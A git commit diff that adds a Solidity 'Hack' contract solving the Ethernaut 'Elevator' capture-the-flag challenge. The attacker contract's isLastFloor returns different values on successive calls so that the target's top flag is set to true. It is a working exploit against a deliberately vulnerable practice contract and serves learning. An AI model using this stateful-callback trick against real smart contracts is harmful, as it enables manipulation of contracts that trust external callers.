6bdffa8a5529b11fd9908f46aa9ad098ef84477a
465326302 <465326302@qq.com>
2023-02-09 17:33:20 +0800

    Elevator

--- Ethernaut/Elevator.sol
+++ Ethernaut/Elevator.sol
@@ -1,6 +1,25 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+contract Hack{
+
+    Elevator private immutable target;
+    uint private count;
+    
+    constructor (address _target) {
+        target = Elevator(_target);
+    }
+    function pwn() external {
+        target.goTo(1);
+        require(target.top(), "not top");
+    }
+    function isLastFloor(uint) external returns (bool) {
+        count++;
+        return count > 1;
+
+    }
+
+}
 interface Building {
     function isLastFloor(uint) external returns(bool);
 }
